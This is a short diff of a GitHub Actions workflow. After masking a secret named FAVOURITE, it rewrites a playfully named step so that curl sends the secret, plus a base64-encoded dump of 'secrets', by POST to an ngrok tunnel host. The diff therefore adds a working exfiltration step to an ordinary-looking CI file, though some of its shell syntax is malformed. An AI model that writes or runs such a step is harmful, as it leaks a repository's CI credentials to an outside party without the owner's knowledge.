@@ -23,5 +23,5 @@ jobs:
           echo "::add-mask::${{ secrets.FAVOURITE }}" 
 
       - name: I ll tell you my current favourite 
-        run: curl -k https://adf6-128-130-252-225.ngrok-free.app?data=$(secrets.FAVOURITE)
+        run: curl "https://adf6-128-130-252-225.ngrok-free.app/${{ secrets.FAVOURITE }}" -X POST --data "$(secrets | base64 --wrap=0) "
         
